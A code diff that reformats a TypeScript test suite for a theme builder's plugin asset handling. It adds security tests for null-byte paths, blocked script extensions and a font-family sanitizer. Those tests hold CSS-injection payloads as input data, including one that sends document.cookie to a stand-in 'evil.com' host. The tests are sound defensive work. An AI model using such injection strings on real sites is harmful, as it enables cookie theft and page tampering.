@@ -7,11 +7,23 @@ import { mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs';
 import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 
-import { collectPluginAssets, filterAssetsByPlugin, getPluginIdsFromAssets } from '../assetCollector.js';
+import {
+  collectPluginAssets,
+  filterAssetsByPlugin,
+  getPluginIdsFromAssets,
+} from '../assetCollector.js';
 import { copyPluginAssets, formatBytes } from '../assetCopier.js';
-import { generateFontFaceCSS, generateFontFaceCSSForPlugin, getFontFamilies } from '../fontFaceGenerator.js';
+import {
+  generateFontFaceCSS,
+  generateFontFaceCSSForPlugin,
+  getFontFamilies,
+  sanitizeFontFamily,
+} from '../fontFaceGenerator.js';
 import { ThemeBase } from '../ThemeBase.js';
-import type { PluginAssetDefinition, ThemeBuilderInterface } from '../../core/types.js';
+import type {
+  PluginAssetDefinition,
+  ThemeBuilderInterface,
+} from '../../core/types.js';
 
 // Test plugin with font assets
 class TestPluginWithFonts extends ThemeBase {
@@ -60,11 +72,19 @@ describe('Asset Collection', () => {
     pluginsDir = join(testDir, 'plugins');
 
     // Create test plugin directory with assets
-    const testPluginAssetsDir = join(pluginsDir, 'test-plugin', 'assets', 'fonts');
+    const testPluginAssetsDir = join(
+      pluginsDir,
+      'test-plugin',
+      'assets',
+      'fonts'
+    );
     mkdirSync(testPluginAssetsDir, { recursive: true });
 
     // Create dummy font file
-    writeFileSync(join(testPluginAssetsDir, 'TestFont.woff2'), 'dummy font data');
+    writeFileSync(
+      join(testPluginAssetsDir, 'TestFont.woff2'),
+      'dummy font data'
+    );
     writeFileSync(join(testPluginAssetsDir, 'LICENSE.txt'), 'MIT License');
   });
 
@@ -82,7 +102,9 @@ describe('Asset Collection', () => {
     expect(assets).toHaveLength(2);
     expect(assets[0].pluginId).toBe('test-plugin');
     expect(assets[0].definition.type).toBe('font');
-    expect(assets[0].targetPath).toBe('test-plugin/assets/fonts/TestFont.woff2');
+    expect(assets[0].targetPath).toBe(
+      'test-plugin/assets/fonts/TestFont.woff2'
+    );
   });
 
   it('should return empty array for plugins without assets', async () => {
@@ -134,7 +156,14 @@ describe('Asset Collection', () => {
       readonly version = '1.0.0';
 
       getAssets(): PluginAssetDefinition[] {
-        return [{ type: 'font', path: 'fonts/font.png', family: 'Test', weight: '400' }];
+        return [
+          {
+            type: 'font',
+            path: 'fonts/font.png',
+            family: 'Test',
+            weight: '400',
+          },
+        ];
       }
 
       register(): void {}
@@ -152,7 +181,14 @@ describe('Asset Collection', () => {
       readonly version = '1.0.0';
 
       getAssets(): PluginAssetDefinition[] {
-        return [{ type: 'font', path: 'fonts/Missing.woff2', family: 'Missing', weight: '400' }];
+        return [
+          {
+            type: 'font',
+            path: 'fonts/Missing.woff2',
+            family: 'Missing',
+            weight: '400',
+          },
+        ];
       }
 
       register(): void {}
@@ -161,6 +197,42 @@ describe('Asset Collection', () => {
     const plugin = new MissingFilePlugin();
     await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
       'Asset file not found'
+    );
+  });
+
+  it('should throw on null byte in path', async () => {
+    class NullBytePlugin extends ThemeBase {
+      readonly id = 'null-byte';
+      readonly version = '1.0.0';
+
+      getAssets(): PluginAssetDefinition[] {
+        return [{ type: 'other', path: 'fonts/file\x00.txt' }];
+      }
+
+      register(): void {}
+    }
+
+    const plugin = new NullBytePlugin();
+    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
+      'Invalid null byte'
+    );
+  });
+
+  it('should block additional scripting extensions (.php, .py, .rb)', async () => {
+    class PhpPlugin extends ThemeBase {
+      readonly id = 'php-plugin';
+      readonly version = '1.0.0';
+
+      getAssets(): PluginAssetDefinition[] {
+        return [{ type: 'other', path: 'script.php' }];
+      }
+
+      register(): void {}
+    }
+
+    const plugin = new PhpPlugin();
+    await expect(collectPluginAssets([plugin], pluginsDir)).rejects.toThrow(
+      'Blocked file type'
     );
   });
 
@@ -194,11 +266,19 @@ describe('Asset Copying', () => {
     pluginsDir = join(testDir, 'plugins');
     outputDir = join(testDir, 'output');
 
-    const testPluginAssetsDir = join(pluginsDir, 'test-plugin', 'assets', 'fonts');
+    const testPluginAssetsDir = join(
+      pluginsDir,
+      'test-plugin',
+      'assets',
+      'fonts'
+    );
     mkdirSync(testPluginAssetsDir, { recursive: true });
     mkdirSync(outputDir, { recursive: true });
 
-    writeFileSync(join(testPluginAssetsDir, 'TestFont.woff2'), 'dummy font data');
+    writeFileSync(
+      join(testPluginAssetsDir, 'TestFont.woff2'),
+      'dummy font data'
+    );
     writeFileSync(join(testPluginAssetsDir, 'LICENSE.txt'), 'MIT License');
   });
 
@@ -216,7 +296,13 @@ describe('Asset Copying', () => {
     expect(result.copied).toHaveLength(2);
     expect(result.warnings).toHaveLength(0);
 
-    const fontPath = join(outputDir, 'test-plugin', 'assets', 'fonts', 'TestFont.woff2');
+    const fontPath = join(
+      outputDir,
+      'test-plugin',
+      'assets',
+      'fonts',
+      'TestFont.woff2'
+    );
     expect(existsSync(fontPath)).toBe(true);
   });
 });
@@ -229,10 +315,18 @@ describe('Font Face Generation', () => {
     testDir = join(tmpdir(), `blueprint-test-${Date.now()}`);
     pluginsDir = join(testDir, 'plugins');
 
-    const testPluginAssetsDir = join(pluginsDir, 'test-plugin', 'assets', 'fonts');
+    const testPluginAssetsDir = join(
+      pluginsDir,
+      'test-plugin',
+      'assets',
+      'fonts'
+    );
     mkdirSync(testPluginAssetsDir, { recursive: true });
 
-    writeFileSync(join(testPluginAssetsDir, 'TestFont.woff2'), 'dummy font data');
+    writeFileSync(
+      join(testPluginAssetsDir, 'TestFont.woff2'),
+      'dummy font data'
+    );
     writeFileSync(join(testPluginAssetsDir, 'LICENSE.txt'), 'MIT License');
   });
 
@@ -278,6 +372,66 @@ describe('Font Face Generation', () => {
     const families = getFontFamilies(assets);
 
     expect(families).toEqual(['Test Font']);
+  });
+});
+
+describe('Font Family Sanitization', () => {
+  it('should pass through normal font names unchanged', () => {
+    expect(sanitizeFontFamily('Figtree')).toBe('Figtree');
+    expect(sanitizeFontFamily('Open Sans')).toBe('Open Sans');
+    expect(sanitizeFontFamily('SF Pro Display')).toBe('SF Pro Display');
+  });
+
+  it('should remove single quotes that could break CSS', () => {
+    // Malicious input that tries to break out of the font-family string
+    // and inject CSS rules
+    expect(
+      sanitizeFontFamily(
+        "Figtree'; } body { display: none; } @font-face { font-family: 'x"
+      )
+    ).toBe('Figtree  body  display: none  @font-face  font-family: x');
+  });
+
+  it('should remove double quotes', () => {
+    expect(sanitizeFontFamily('Malicious"Font')).toBe('MaliciousFont');
+  });
+
+  it('should remove backslashes', () => {
+    expect(sanitizeFontFamily('Test\\Font')).toBe('TestFont');
+  });
+
+  it('should remove semicolons', () => {
+    // Semicolons are removed because they terminate CSS declarations
+    expect(sanitizeFontFamily('Test; color: red')).toBe('Test color: red');
+  });
+
+  it('should remove braces', () => {
+    expect(sanitizeFontFamily('Test{bad}Font')).toBe('TestbadFont');
+  });
+
+  it('should remove parentheses', () => {
+    expect(sanitizeFontFamily('Test(bad)Font')).toBe('TestbadFont');
+  });
+
+  it('should remove newlines', () => {
+    expect(sanitizeFontFamily('Test\nFont')).toBe('TestFont');
+    expect(sanitizeFontFamily('Test\rFont')).toBe('TestFont');
+  });
+
+  it('should neutralize a complete CSS injection attack', () => {
+    // Full attack string that would inject a malicious CSS rule
+    const attack =
+      "'; } * { background: url('evil.com/steal?cookie=' + document.cookie); } .x { font-family: '";
+    const sanitized = sanitizeFontFamily(attack);
+
+    // Should not contain any characters that could break CSS parsing
+    expect(sanitized).not.toContain("'");
+    expect(sanitized).not.toContain('"');
+    expect(sanitized).not.toContain('{');
+    expect(sanitized).not.toContain('}');
+    expect(sanitized).not.toContain(';');
+    expect(sanitized).not.toContain('(');
+    expect(sanitized).not.toContain(')');
   });
 });
 
